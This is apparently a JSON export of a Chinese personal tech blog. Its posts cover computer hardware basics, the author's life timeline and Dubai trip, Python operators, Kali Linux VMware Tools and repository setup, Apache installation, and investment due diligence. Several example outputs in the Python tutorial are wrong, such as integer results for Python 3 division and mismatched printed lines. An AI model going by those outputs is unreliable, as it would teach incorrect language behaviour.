在电气时代发现了电流，电子、电磁、电磁波、也有了世界第一台电子计算机。 后来又设计了机器语言、汇编语言、各种各样的编程语言，其中比较经典的是直到今天还有很多人学习使用的C语言、C++。 Unix、Linux、Windows操作系统也在不久之后诞生了第一个版本。 1999年上映了一部电影《异次元骇客》，电影讲述了用计算机虚拟出了洛杉矶，随着科学的发展以及人类对宇宙的观察。 有了一种新的猜测： 我们人类是被创造和设计的，就像程序员编写的游戏一样。 各种各样的自然法则，大气压，水压，重力，光速，声速等都是被提前设定好的。 著名的小说《三体》，电影《超时空接触》《星际穿越》《最远的地方》《黑客帝国》《月球》等艺术作品也拓展了我们想象的边缘。 如果你喜欢看一些网络小说和电影，那《无限恐怖》小说更是让人眼前一亮，脑洞大开。 人类与身居来的好奇心，不断地探索中，有很多我们肉眼无法看到的神秘力量。 这些东西对我们生活中吃喝拉撒似乎没有任何的意义，但只要把眼光抬高一点，仰望星空，一种奇妙难以言喻的心情，那是我们对未知，对真相的渴望。 温家宝总理2007年5月14日公布了一首诗歌《仰望星空》 一个民族有一些关注天空的人，他们才有希望；一个民族只是关心脚下的事情，那是没有未来的。 我们的民族是大有希望的民族！我希望同学们经常地仰望天空，学会做人，学会思考，学会知识和技能，做一个关心世界和国家命运的人。 仰望星空 我仰望星空， 它是那样辽阔而深邃； 那无穷的真理， 让我苦苦地求索追随。 我仰望星空， 它是那样庄严而圣洁； 那凛然的正义， 让我充满热爱、感到敬畏。 我仰望星空， 它是那样自由而宁静； 那博大的胸怀， 让我的心灵栖息依偎。 我仰望星空， 它是那样壮丽而光辉； 那永恒的炽热， 让我心中燃起希望的烈焰、响起春雷。 电脑结构 以上结构图，最初是由 冯·诺伊曼 （计算机科学家）所提出，又称之为”冯·诺伊曼结构“ 图中分别为：输入设备、输出设备、存储器、运算器和控制器；这些都是计算机的主要部件。 我们在玩电脑的时候，我们使用键盘鼠标来操作电脑，我们在和其他人QQ聊天的时候，鼠标可以帮我们选中聊天的人， 打开聊天窗口，键盘则是负责打字，帮我们输入聊天的内容。 我们在操作键盘鼠标的时候，其实都是在告诉电脑来做什么的。我们管键盘和鼠标叫输入设备。 输入设备： 向电脑输入数据和信息的设备。除了键盘。除了键盘鼠标，其他输入设备还包括触摸板、麦克风、摄像头，游戏手柄、扫描仪等等 显示器用来向我们展示画面，显示内容，音箱则播放音乐给我们听，我们管他们叫输出设备。 输出设备： 将电脑中的信息输出给用户的设备。常用的输入设备有：显示器、音箱、打印机、投影仪等等 我们买来电脑，如果只有键盘鼠标、显示器、音箱，我们能玩电脑么？肯定不能。 那么其实电脑机箱才是真正的工作的设备， 输入输出设备只是用来让我们和电脑机箱来做交互的。 那机箱内部都有什么呢？我们看一下下面的图片： 我们来看一下这里的零件都有什么用 主板 连接所有其他设备的设备，是其他设备的载体，主板主要是为CPU、内存、显卡、硬盘等提供平台，相当于人体的躯干，关联着各个器官。 中央处理器（Cntral Pocessing Uit ） CPU：中央处理单元(Cntral Pocessing Uit)的缩写，也叫处理器，是计算机的运算核心和控制核心。人靠大脑思考，电脑靠CPU来运算、控制。让电脑的各个部件顺利工作，起到协调和控制作用。 硬盘 硬盘：存储资料和软件等数据的设备，有容量大，断电数据不丢失的特点。也被人们称之为“数据仓库”。 内存 内存：1. 负责硬盘等硬件上的数据与CPU之间数据交换处理；2. 缓存系统中的临时数据。3. 断电后数据丢失。 显卡 显卡：显示器想要呈现画面，显卡是关键。简单来说，就是负责在显示屏上显示一切信息。打个比方，它就像是人的眼睛，没有了它，电脑就无法驱动形成图像了。 显卡性能好，电脑的图形处理能力就高，尤其在玩游戏时更能发现这个（所以很多游戏会要求显卡性能）对玩家而言，最好选择独立显卡。不过，如果不玩大型游戏，CPU内置核心显卡也基本能满足要求;缺点： 系统功耗有所加大，发热量也较大，额外购买 。 电源 电源：将电压220伏的市电转换为低等电压，然后送到主板及各个硬件！供电！电脑运行需要电力，而电源就是为此供电的，也可以说它在为电脑提供一切动力。电源决定了电脑的稳定性。它和人体心脏功能类似，都是提供动力的核心。 网卡 网卡：提供联网的硬件，一般集成在主板上。 其他… 说了这么多，其实最最重要的设备是什么呢？ CPU、硬盘、内存。 现在我们来说一下CPU、硬盘、内存三者之间的关系。 首先 ,我们先回想一下三者的作用： CPU：是计算机的运算核心和控制核心，让电脑的各个部件顺利工作，起到协调和控制作用。 硬盘：存储资料和软件等数据的设备，有容量大，断电数据不丢失的特点。 也被人们称之为“数据仓库”。 内存：1. 负责硬盘等硬件上的数据与CPU之间数据交换处理；2. 缓存系统中的临时数据。3. 断电后数据丢失。 然后， 我们再来看一下程序是如何执行起来的。 当我们在电脑上打开QQ时（右键-打开 或者双击QQ图标），其实是通过鼠标（输入设备）向CPU发送了一条命令，CPU接收到这条命令后， QQ程序就从硬盘里被加载到内存（加载时不通过处理器，直接从硬盘加载程序到内存里），加载完成后，CPU就开始执行QQ程序。 程序执行起来后，CPU可以让QQ程序显示在我们的在显示器上。也就是你看到了QQ 程序运行起来了。如果这个时候，你用QQ截取了一张屏幕的图片， 那么这张图片会首先保存到内存，在没有退出截屏状态时，你可以在这张图片上写字、画线条，等你右键保存这张图片的时候，这张图片就会保存到硬盘里。 通过了解一个程序是如何运行起来的，我们就可以了解三者是如何工作的 。 可能有些人会不明白，如果程序是这样执行起来的话，那么为什么CPU不直接在硬盘里执行程序，而非要把程序放到内存后在执行呢？ 这里是有原因的。我们先来看几张图： 好点的企业用机械硬盘 ： 内存的读写速度： 通过上图我们可以看出，内存存取数据的速度比硬盘的存取速度快了10倍， 在某些环境里，硬盘和内存之间的速度差距可能会更大。 而CPU的速度比内存不知还要快多少倍。当我们把程序从硬盘放到内存以后，CPU就直接在内存运行程序，这样比CPU直接在硬盘运行程序就要快很多。 内存解决了一部分CPU运行过快，而硬盘数据存取太慢的问题。 提高了我们的电脑的运行速度。 内存就如同一条“高速车道”一般，数据由传输速度较慢的硬盘通过这条高速车道传送至CPU进行处理！ 但内存是带电存储的(一旦断电数据就会消失)，而且容量有限，所以要长时间储存程序或数据就需要使用硬盘。 其实内存在这里起了两个作用： \\1. 保存从硬盘读取的数据，提供给CPU使用 \\2. 保存CPU的一些临时执行结果，以便CPU下次使用或保存到硬盘 三者之间的关系： 简单来说，硬盘用来存储我们的程序和数据，当我们运行程序的时候，CPU首先接受到我们的命令，之后CPU是告诉硬盘，我要运行你存储的程序A， 你把程序A送到内存去。CPU对内存说，我让硬盘把程序A送到你这里来了，你保存一下。 等程序A被完整的送到内存之后。CPU就开始执行程序A。 过程就像上面说的，我们在举一个接近我们生活的例子。 如果说把硬盘比喻成一个大仓库，CPU比喻成加工车间，那么内存就是一个临时的小仓库；从距离上来说， 相比内存到CPU的距离和硬盘到内存的距离，内存和CPU的距离更短；硬盘（大仓库）用来保存车间需要用的原料和最终生产出来的商品。仓库太大，取出原料和存储商品太慢，耗时间。 内存（临时小仓库）：原料会先放到这里，小仓库，可以很快的找到需要的原料或商品。 CPU（车间）：从内存（小仓库）里拿到原料，生产商品。中间会有半成品，半成品可以放在内存（小仓库）里。","categories":[{"name":"简谈计算机","slug":"简谈计算机","permalink":"https://xiaowuyoucy.github.io/categories/简谈计算机/"}],"tags":[{"name":"计算机基础","slug":"计算机基础","permalink":"https://xiaowuyoucy.github.io/tags/计算机基础/"}]},{"title":"人生事件纪要","slug":"201909250204","date":"2019-09-24T18:18:00.000Z","updated":"2019-10-18T11:43:45.679Z","comments":true,"path":"2019/09/25/201909250204/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/09/25/201909250204/","excerpt":"","text":"1996.02.06 出生 2003.09.01 开始小学生涯 2009.07.01 结束小学生涯 2009.09.01 开始初中生涯 2011.07.01 结束初中生涯 2011.05.01 开始高中生涯 2013.05.01 结束高中生涯 2013.09.01 开始大学生涯 2015.7.01 结算大学生涯 2015.08 第一份实习工作 2015.08-2016.02 工作内容：前端开发 2016.03 嘉峪科技有限公司 2016.03-2016.12 工作内容：网络安全 2016.04.北京的记忆 2016.04 第一次去北京;目的：访问朋友，互相交流学习 同年在北京感受了人生中，第一场大雪。 2017.11.第一次开始创业 地点:北京昌平区 2018.06 第一次融资 ；地点:北京 2018.06.加入老男孩教育 加入老男孩旗下的 (深圳市爱编程教育科技有限公司) 深圳分校 任职：项目经理兼讲师 2019.08.迪拜出行 2019.08 第一次去迪拜;目的：相约于迪拜 机场出行前，我看到机场有Exchange货币兑换的服务站，换了些美刀（世界通用货币） 广州白云国际机场----&gt;排队取机票 买了从白云机场到科伦波，中转迪拜的航班机票 途径----&gt;科伦波----&gt;里斯兰卡 这一晚我没有睡，在飞机上打了一晚的斯洛克 早上 7:30分（科伦波时间） 抵达了 里斯兰卡机场，在机场待了一个上午 中午（12:55时）从里斯兰卡机场飞往迪拜 里斯兰卡上空 20:00时（北京时间）抵达迪拜国际机场 办理出境手续 迪拜的地铁 穿上了当地人的衣服（长袍） 是当地的一种文化 与朋友一起购买，当然是他们购物 - -! 我负责拿东西 见识了当今世界上最高的建筑， 哈利法塔（Burj Khalifa Tower ） 哈利法塔的电梯 ，世界上最快的电梯之一 身处于在哈利法塔（Burj Khalifa Tower ）顶层 位于著名的帆船酒店（ Burj Al Arab ）沙滩 回程的时候，我决定去一趟位于迪拜100多公里外的，阿布扎比市 位于阿布扎比法拉利公园 机场的美食广场内有麦当劳、汉堡王、法式饼店及印度远东餐厅等。此外还有星巴克、雪糕店等，在迪拜机场，总能找到你喜欢的口味，迪拜机场有很多中国售货员，在异国他乡听到服务员跟你说国语格外亲切,看桌面上的“亮点” 是我随时带着的充电宝，中国街电，我背包里还有好几个充电宝呢，哈哈。 在离开迪拜之前，在机场内逛了逛，迪拜机场内也非常奢华，所有的挂钟都是劳力士的，尽显奢华 ，这时我没有拍照片，这里名气最大的还是免税店，被誉为世界上第三大机场免税店，24小时营业，迪拜机场每年都举行机场购物中大奖促销活动，任何一个乘客，凡机场购物蛮一定金额，都有机会赢得豪华轿车，当然我能说这是个噱头吗？哪有那么容易，让你抽到豪车走，想想就好了。 逛了一下，也不知道买些什么手信带回去给朋友们，思路想去的也觉得没有什么可买，最后买了几条迪拜的香烟 我们则如同走在机场的传输带上一样,有信心的话我们可以倒着走,让别人先去,我们慢慢的欣赏沿途风景,因为 未来的生活是你今天的决定。 就满脸胡子的那个土著朋友，感叹的说 “此次的离别，不知道何时有机会见面，我说我们合影留念吧“ 我这朋友中文讲得不错好，给大家show一下 他讲中文的视频，哈哈哈~~~~ 我于23:30时（阿联酋迪拜时间）登上了飞机离开这片沙漠，此时是我人生中第一次坐世界上最大的客机A380，但我并不开心，因为我丢掉了行李箱，在起飞之前我尝试和飞机上的空姐以及机长沟通，容许我几分钟时间，让我去拿一下行李箱，他们对我说“NO” 理由是马上要起飞了，行李箱里面有我新买的衣服以及心爱的Nike鞋子，还有一些朋友送的东西，迪拜本地的特产。 只追求有道理 会耽误有效果的人生，难以有成功快乐的体验 用快乐带动心情，用观念导航人生 用执着追求事业 ，用真诚对待朋友，用平淡对待磨难，用努力追求幸福，用感恩对待生活，这就是人生旅途需要寻找的平衡点。","categories":[{"name":"关于博主","slug":"关于博主","permalink":"https://xiaowuyoucy.github.io/categories/关于博主/"}],"tags":[{"name":"人生事记","slug":"人生事记","permalink":"https://xiaowuyoucy.github.io/tags/人生事记/"}]},{"title":"Python运算符","slug":"201609060218","date":"2019-09-05T18:20:00.000Z","updated":"2019-09-05T21:19:05.032Z","comments":true,"path":"2019/09/06/201609060218/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/09/06/201609060218/","excerpt":"","text":"本章节主要说明Python的运算符。举个简单的例子 4 +5 = 9 。 例子中，4 和 5 被称为操作数，&quot;+&quot; 称为运算符。 Python语言支持以下类型的运算符: Python算术运算符 以下假设变量： a=10，b=20： 运算符描述实例 +加 - 两个对象相加 a + b 输出结果 30 -减 - 得到负数或是一个数减去另一个数 a - b 输出结果 -10 *乘 - 两个数相乘或是返回一个被重复若干次的字符串 a * b 输出结果 200 /除 - x除以y b / a 输出结果 2 %取模 - 返回除法的余数 b % a 输出结果 0 **幂 - 返回x的y次幂 a**b 为10的20次方， 输出结果 100000000000000000000 //取整除 - 返回商的整数部分（向下取整） &gt;&gt;&gt; 9//2 4 &gt;&gt;&gt; -9//2 -5 以下实例演示了Python所有算术运算符的操作： 123456789101112131415161718192021222324252627282930313233343536373839#!/usr/bin/python3# -*- coding: utf-8 -*-# @Time : 2019/9/6 2:03# @Author : JIANWEIWEN# @Email : wjw19951218@gmail.com# @File : 1.运算符.py# @Software: PyCharma = 21b = 10c = 0c = a + bprint(\"1 - c 的值为：\", c)c = a - bprint(\"2 - c 的值为：\", c)c = a * bprint(\"3 - c 的值为：\", c)c = a / bprint(\"4 - c 的值为：\", c)c = a % bprint(\"5 - c 的值为：\", c)# 修改变量 a 、b 、ca = 2b = 3c = a ** bprint(\"6 - c 的值为：\", c)a = 10b = 5c = a // bprint(\"7 - c 的值为：\", c) 以上实例输出结果： 1 - c 的值为： 31 2 - c 的值为： 11 3 - c 的值为： 210 4 - c 的值为： 2 5 - c 的值为： 1 6 - c 的值为： 8 7 - c 的值为： 2 注意：Python2.x 里，整数除整数，只能得出整数。如果要得到小数部分，把其中一个数改成浮点数即可。 &gt;&gt;&gt; 1/2 0 &gt;&gt;&gt; 1.0/2 0.5 &gt;&gt;&gt; 1/float(2) 0.5 Python比较运算符 以下假设变量a为10，变量b为20： 运算符 描述 实例 == 等于 - 比较对象是否相等 (a == b) 返回 False。 != 不等于 - 比较两个对象是否不相等 (a != b) 返回 true. &lt;&gt; 不等于 - 比较两个对象是否不相等 (a &lt;&gt; b) 返回 true。这个运算符类似 != 。 &gt; 大于 - 返回x是否大于y (a &gt; b) 返回 False。 &lt; 小于 - 返回x是否小于y。所有比较运算符返回1表示真，返回0表示假。这分别与特殊的变量True和False等价。 (a &lt; b) 返回 true。 &gt;= 大于等于 - 返回x是否大于等于y。 (a &gt;= b) 返回 False。 &lt;= 小于等于 - 返回x是否小于等于y。 (a &lt;= b) 返回 true。 以下实例演示了Python所有比较运算符的操作： 1234567891011121314151617181920212223242526272829303132333435363738394041a = 21b = 10c = 0if a == b: print(\"1 - a 等于 b\")else: print( \"1 - a 不等于 b\")if a != b: print( \"2 - a 不等于 b\")else: print( \"2 - a 等于 b\")if a &lt; b: print( \"3 - a 不等于 b\")else: print( \"3 - a 等于 b\")if a &lt; b: print (\"4 - a 小于 b\")else: print( \"4 - a 大于等于 b\")if a &gt; b: print( \"5 - a 大于 b\")else: print (\"5 - a 小于等于 b\")# 修改变量 a 和 b 的值a = 5b = 20if a &lt;= b: print(\"6 - a 小于等于 b\")else: print(\"6 - a 大于 b\")if b &gt;= a: print(\"7 - b 大于等于 a\")else: print(\"7 - b 小于 a\") 以上实例输出结果： 1 - a 不等于 b 2 - a 不等于 b 3 - a 不等于 b 4 - a 大于等于 b 5 - a 大于 b 6 - a 小于等于 b 7 - b 大于等于 a 以下实例演示了Python所有赋值运算符的操作： 12345678910111213141516171819202122232425a = 21b = 10c = 0c = a + bprint( \"1 - c 的值为：\", c)c += aprint( \"2 - c 的值为：\", c)c *= aprint( \"3 - c 的值为：\", c)c /= aprint( \"4 - c 的值为：\", c)c = 2c %= aprint( \"5 - c 的值为：\", c)c **= aprint( \"6 - c 的值为：\", c)c //= aprint( \"7 - c 的值为：\", c) 以上实例输出结果： 1 - c 的值为： 31 2 - c 的值为： 52 3 - c 的值为： 1092 4 - c 的值为： 52 5 - c 的值为： 2 6 - c 的值为： 2097152 7 - c 的值为： 99864 Python位运算符 按位运算符是把数字看作二进制来进行计算的。Python中的按位运算法则如下： 下表中变量 a 为 60，b 为 13，二进制格式如下： a = 0011 1100 b = 0000 1101 ----------------- a&amp;b = 0000 1100 a|b = 0011 1101 a^b = 0011 0001 ~a = 1100 0011 运算符 描述 实例 &amp; 按位与运算符：参与运算的两个值,如果两个相应位都为1,则该位的结果为1,否则为0 (a &amp; b) 输出结果 12 ，二进制解释： 0000 1100 | 按位或运算符：只要对应的二个二进位有一个为1时，结果位就为1。 (a | b) 输出结果 61 ，二进制解释： 0011 1101 ^ 按位异或运算符：当两对应的二进位相异时，结果为1 (a ^ b) 输出结果 49 ，二进制解释： 0011 0001 ~ 按位取反运算符：对数据的每个二进制位取反,即把1变为0,把0变为1 。~x 类似于 -x-1 (~a ) 输出结果 -61 ，二进制解释： 1100 0011，在一个有符号二进制数的补码形式。 &lt;&lt; 左移动运算符：运算数的各二进位全部左移若干位，由 &lt;&lt; 右边的数字指定了移动的位数，高位丢弃，低位补0。 a &lt;&lt; 2 输出结果 240 ，二进制解释： 1111 0000 &gt;&gt; 右移动运算符：把&quot;&gt;&gt;&quot;左边的运算数的各二进位全部右移若干位，&gt;&gt; 右边的数字指定了移动的位数 a &gt;&gt; 2 输出结果 15 ，二进制解释： 0000 1111 以下实例演示了Python所有位运算符的操作： 123456789101112131415161718192021a = 60 # 60 = 0011 1100b = 13 # 13 = 0000 1101c = 0c = a &amp; b # 12 = 0000 1100print(\"1 - c 的值为：\", c)c = a | b # 61 = 0011 1101print(\"2 - c 的值为：\", c)c = a ^ b # 49 = 0011 0001print(\"3 - c 的值为：\", c)c = ~a # -61 = 1100 0011print(\"4 - c 的值为：\", c)c = a &lt;&lt; 2 # 240 = 1111 0000print(\"5 - c 的值为：\", c)c = a &gt;&gt; 2 # 15 = 0000 1111print(\"6 - c 的值为：\", c) 以上实例输出结果： 1 - c 的值为： 12 2 - c 的值为： 61 3 - c 的值为： 49 4 - c 的值为： -61 5 - c 的值为： 240 6 - c 的值为： 15 Python逻辑运算符 Python语言支持逻辑运算符，以下假设变量 a 为 10, b为 20: 运算符 逻辑表达式 描述 实例 and x and y 布尔&quot;与&quot; - 如果 x 为 False，x and y 返回 False，否则它返回 y 的计算值。 (a and b) 返回 20。 or x or y 布尔&quot;或&quot; - 如果 x 是非 0，它返回 x 的值，否则它返回 y 的计算值。 (a or b) 返回 10。 not not x 布尔&quot;非&quot; - 如果 x 为 True，返回 False 。如果 x 为 False，它返回 True。 not(a and b) 返回 False 以上实例输出结果： 12345678910111213141516a = 0b = 20if a and b: print(\"3 - 变量 a 和 b 都为 true\")else: print(\"3 - 变量 a 和 b 有一个不为 true\")if a or b: print(\"4 - 变量 a 和 b 都为 true，或其中一个变量为 true\")else: print(\"4 - 变量 a 和 b 都不为 true\")if not (a and b): print(\"5 - 变量 a 和 b 都为 false，或其中一个变量为 false\")else: print(\"5 - 变量 a 和 b 都为 true\") 以上实例输出结果： 1 - 变量 a 和 b 都为 true 2 - 变量 a 和 b 都为 true，或其中一个变量为 true 3 - 变量 a 和 b 有一个不为 true 4 - 变量 a 和 b 都为 true，或其中一个变量为 true 5 - 变量 a 和 b 都为 false，或其中一个变量为 false Python成员运算符 除了以上的一些运算符之外，Python还支持成员运算符，测试实例中包含了一系列的成员，包括字符串，列表或元组。 运算符 描述 实例 in 如果在指定的序列中找到值返回 True，否则返回 False。 x 在 y 序列中 , 如果 x 在 y 序列中返回 True。 not in 如果在指定的序列中没有找到值返回 True，否则返回 False。 x 不在 y 序列中 , 如果 x 不在 y 序列中返回 True。 以下实例演示了Python所有成员运算符的操作： 1234567891011121314151617181920a = 10b = 20list = [1, 2, 3, 4, 5]if (a in list): print(\"1 - 变量 a 在给定的列表中 list 中\")else: print(\"1 - 变量 a 不在给定的列表中 list 中\")if (b not in list): print(\"2 - 变量 b 不在给定的列表中 list 中\")else: print(\"2 - 变量 b 在给定的列表中 list 中\")# 修改变量 a 的值a = 2if (a in list): print(\"3 - 变量 a 在给定的列表中 list 中\")else: print(\"3 - 变量 a 不在给定的列表中 list 中\") 以上实例输出结果： 1 - 变量 a 不在给定的列表中 list 中 2 - 变量 b 不在给定的列表中 list 中 3 - 变量 a 在给定的列表中 list 中 Python身份运算符 身份运算符用于比较两个对象的存储单元 运算符 描述 实例 is is 是判断两个标识符是不是引用自一个对象 x is y, 类似 id(x) == id(y) , 如果引用的是同一个对象则返回 True，否则返回 False is not is not 是判断两个标识符是不是引用自不同对象 x is not y ， 类似 id(a) != id(b)。如果引用的不是同一个对象则返回结果 True，否则返回 False。 注： id() 函数用于获取对象内存地址。 以下实例演示了Python所有身份运算符的操作： 123456789101112131415161718192021222324a = 20b = 20if (a is b): print(\"1 - a 和 b 有相同的标识\")else: print(\"1 - a 和 b 没有相同的标识\")if (a is not b): print(\"2 - a 和 b 没有相同的标识\")else: print(\"2 - a 和 b 有相同的标识\")# 修改变量 b 的值b = 30if (a is b): print(\"3 - a 和 b 有相同的标识\")else: print(\"3 - a 和 b 没有相同的标识\")if (a is not b): print(\"4 - a 和 b 没有相同的标识\")else: print(\"4 - a 和 b 有相同的标识\") 以上实例输出结果： 1 - a 和 b 有相同的标识 2 - a 和 b 有相同的标识 3 - a 和 b 没有相同的标识 4 - a 和 b 没有相同的标识 is 与 == 区别： is 用于判断两个变量引用对象是否为同一个(同一块内存空间)， == 用于判断引用变量的值是否相等。 &gt;&gt;&gt; a = [1, 2, 3] &gt;&gt;&gt; b = a &gt;&gt;&gt; b is a True &gt;&gt;&gt; b == a True &gt;&gt;&gt; b = a[:] &gt;&gt;&gt; b is a False &gt;&gt;&gt; b == a True Python运算符优先级 以下表格列出了从最高到最低优先级的所有运算符： 运算符 描述 ** 指数 (最高优先级) ~ + - 按位翻转, 一元加号和减号 (最后两个的方法名为 +@ 和 -@) * / % // 乘，除，取模和取整除 + - 加法减法 &gt;&gt; &lt;&lt; 右移，左移运算符 &amp; 位 ‘AND’ ^ | 位运算符 &lt;= &lt; &gt; &gt;= 比较运算符 &lt;&gt; == != 等于运算符 = %= /= //= -= += *= **= 赋值运算符 is is not 身份运算符 in not in 成员运算符 not and or 逻辑运算符 以下实例演示了Python所有运算符优先级的操作： 1234567891011121314151617a = 20b = 10c = 15d = 5e = 0e = (a + b) * c / d # ( 30 * 15 ) / 5print(\"(a + b) * c / d 运算结果为：\", e)e = (a + b) * c / d # (30 * 15 ) / 5print(\"((a + b) * c) / d 运算结果为：\", e)e = (a + b) * (c / d); # (30) * (15/5)print(\"(a + b) * (c / d) 运算结果为：\", e)e = a + (b * c) / d; # 20 + (150/5)print(\"a + (b * c) / d 运算结果为：\", e) 以上实例输出结果： (a + b) * c / d 运算结果为： 90 ((a + b) * c) / d 运算结果为： 90 (a + b) * (c / d) 运算结果为： 90 a + (b * c) / d 运算结果为： 50","categories":[{"name":"Python","slug":"Python","permalink":"https://xiaowuyoucy.github.io/categories/Python/"}],"tags":[{"name":"Python运算符","slug":"Python运算符","permalink":"https://xiaowuyoucy.github.io/tags/Python运算符/"}]},{"title":"Kali-Linux-Vmtools安装","slug":"201908230654","date":"2019-08-22T22:56:00.000Z","updated":"2019-08-22T23:06:36.151Z","comments":true,"path":"2019/08/23/201908230654/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/08/23/201908230654/","excerpt":"","text":"12345678910111213141516171819202122232425262728293031323334cp /media/cdrom0/VmwareTools-10.0.10-4301.tar.gz .ls 显示当前目录的文件---------------------------------------------------------------------Desktop Downloads Pictures TempLates VmwareTools-10.0.10-4301.tar.gz... .... ... ...解压 VmwareTools-10.0.10-4301.tar.gztar -xf VmwareTools-10.0.10-4301.tar.gzls 显示当前目录的文件---------------------------------------------------------------------Desktop Downloads Pictures TempLates VmwareTools-10.0.10-4301.tar.gz... .... ... ... vmware-tools-distribcd vmware-tools-distrib/ls 显示当前目录的文件---------------------------------------------------------------------Desktop Downloads Pictures TempLates ...... .... ... ... vmware-install.pl执行 vmware-install.pl./ vmware-install.pl之后一路回车即可，完成安装之后需要重启vmtools即可生效。","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[{"name":"vmtools","slug":"vmtools","permalink":"https://xiaowuyoucy.github.io/tags/vmtools/"},{"name":"kali","slug":"kali","permalink":"https://xiaowuyoucy.github.io/tags/kali/"}]},{"title":"kali-linux更新源","slug":"201908230642","date":"2019-08-22T22:45:00.000Z","updated":"2019-08-23T04:26:15.578Z","comments":true,"path":"2019/08/23/201908230642/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/08/23/201908230642/","excerpt":"","text":"123456789101.打开源更新文件root@kali:~# leafpad /ect/sources.list2.把源的地址填写上https://linuxconifg.org/how-to-update-kali-linuxhttps://docs.kali.org/general-use-kali-linux-sources-list-repositories3.执行终端命令apt-get update apt-get upgrade","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[{"name":"vmtools","slug":"vmtools","permalink":"https://xiaowuyoucy.github.io/tags/vmtools/"},{"name":"kalinux更新源","slug":"kalinux更新源","permalink":"https://xiaowuyoucy.github.io/tags/kalinux更新源/"}]},{"title":"apache配置","slug":"201908210144","date":"2019-08-20T17:54:00.000Z","updated":"2019-08-20T18:28:40.119Z","comments":true,"path":"2019/08/21/201908210144/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/08/21/201908210144/","excerpt":"","text":"1.1 Apache的安装 对应的软件如下： Apache安装步骤： 1.解压“httpd-2.4.29-x86-r2.zip”，并将解压后的所有文件拷贝到目标文件夹wamp/apache下。 2.修改apache主配置文件(httpd.conf)中的“SVRROOT”为apache的实际目录。 提示：要修改的文件为：wamp/apache/conf/httpd.conf，大约第38行处。 管理员模式下运行cmd(或powershell)，并在其中运行apache/bin下的命令httpd.exe 如下所示：httpd.exe -k install 提示： httpd.exe所在位置为：apache/bin/目录中 如果想要删除该服务，则运行：httpd.exe -k uninstallt 4.双击打开如下文件并启动服务：wamp/apche/bin/ApacheMonitor.exe 1.2 检测apache配置文件语法的命令","categories":[{"name":"apache","slug":"apache","permalink":"https://xiaowuyoucy.github.io/categories/apache/"}],"tags":[{"name":"apache配置","slug":"apache配置","permalink":"https://xiaowuyoucy.github.io/tags/apache配置/"},{"name":"apache环境变量","slug":"apache环境变量","permalink":"https://xiaowuyoucy.github.io/tags/apache环境变量/"}]},{"title":"如何判断一个项目是否值得投资","slug":"201907150214","date":"2019-07-14T18:27:00.000Z","updated":"2019-07-14T18:57:02.008Z","comments":true,"path":"2019/07/15/201907150214/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/07/15/201907150214/","excerpt":"","text":"一、看准 一个团队（1个团队） 投资就是投人，投资就是投团队，尤其要看准投团队的领头人。创东方对目标企业团队成员的要求是：富有激情、和善诚信、专业敬业、善于学习。 二、发掘 两个优势（1优势行业+2优势企业） 在优势行业中发掘、寻找优势企业。优势行业是指具有广阔发展前景、国家政策支持、市场成长空间巨大的行业；优势企业是在优势行业中具有核心竞争力，细分行业排名靠前的优秀企业，其核心业务或主营业务要突出，企业的核心竞争力要突出，要超越其他竞争者。 三、弄清 三个模式（1业务模式+2盈利模式+3营销模式） 就是弄清目标企业是如何挣钱的。业务模式是企业提供什么产品或服务，业务流程如何实现，包括业务逻辑是否可行，技术是否可行，是否符合消费者心理和使用习惯等，企业的人力、资金、资源是否足以支持。盈利模式是指企业如何挣钱，通过什么手段或环节挣钱。营销模式是企业如何推广自己的产品或服务，销售渠道、销售激励机制如何等。好的业务模式，必须能够赢利，好的赢利模式，必须能够推行。 四、查看 四个指标（1营业收入+2营业利润+3净利率+4增长率） PE 投资的重要目标是目标企业尽快改制上市，我们因此关注、查看近目标企业近三年的上述前两个指标尤为重要。PE投资非常看重的盈利能力和成长性，我们由此关注上述的后两个指标。净利率是销售净利润率，表达了一个企业的盈利能力和抗风险能力，增长率可以迅速降低投资成本，让投资人获取更高的投资回报。把握前四个指标，则基本把握了项目的可投资性。 五、厘清 五个结构（1股权结构+2高管结构+3业务结构+4客户结构+5供应商结构） 厘清五个结构也很重要，让投资人对目标企业的具体结构很清晰，便于判断企业的好坏优劣。 股权结构：主次分明，主次合理； 高管结构：结构合理，优势互补，团结协作； 业务结构：主营突出，不但研发新产品； 客户结构：既不太散又不太集中，客户有实力； 供应商结构：既不太散又不太集中，质量有保证。 六、考察六个层面（1历史合规+2财务规范+3依法纳税+4产权清晰+5劳动合规+6环保合规） 考察六个层面是对目标企业的深度了解，任何一个层面存在关键性问题，可能影响企业的改制上市。当然，有些企业存在一些细小暇疵，可以通过规范手段予以改进。 历史合规：目标企业的历史沿革合法和规，在注册验资、股权变更等方面不存在重大历史瑕疵； 财务规范：财务制度健全，会计标准合规，坚持公正审计； 依法纳税：不存在依法纳税的问题； 产权清晰：企业的产权清晰到位（含专利、商标、房产等），不存在纠纷； 劳动合规：严格执行劳动法规； 6. 环保合规：企业生产经营符合环保要求，不存在搬迁、处罚等隐患。 七、落实 七个关注（1制度汇编+2例会制度+3企业文化+4战略规划+5人力资源+6公共关系+7激励机制） 七个关注是对目标企业细小环节的关注。如果存在其中的问题，可以通过规范、引导的办法加以改进。但其现状是我们判断目标企业经营管理的重要依据。 制度汇编：查看企业的制度汇编可以迅速认识企业管理的规范程度。有的企业制度不全，更没有制度汇编； 例会制度：询问企业的例会情况（含总经理办公周例会、董事会例会、股东会例会）能够了解规范管理情况，也能了解企业高管对股东是否尊重； 企业文化：通过了解企业的文化建设能知道企业是否具有凝聚力和亲和力，是否具备长远发展的可能； 战略规划：了解企业的战略规划情况，可以知道企业的发展有无目标，查看其目标是否符合行业经济发展的实际方向； 人力资源：了解企业对员工培训、激励计划、使用办法，可以了解企业是否能充分调动全体员工发展业务的积极性和能动性，考察企业的综合竞争力； 公共关系：了解企业的公共关系策略和状况，可以知道企业是否具备社会公民意识，是否注重企业形象和品牌，是否具有社会责任意识； 激励机制：一个优秀的现代企业应该有一个激励员工、提升团队的机制或计划，否则，企业难于持续做强做大。 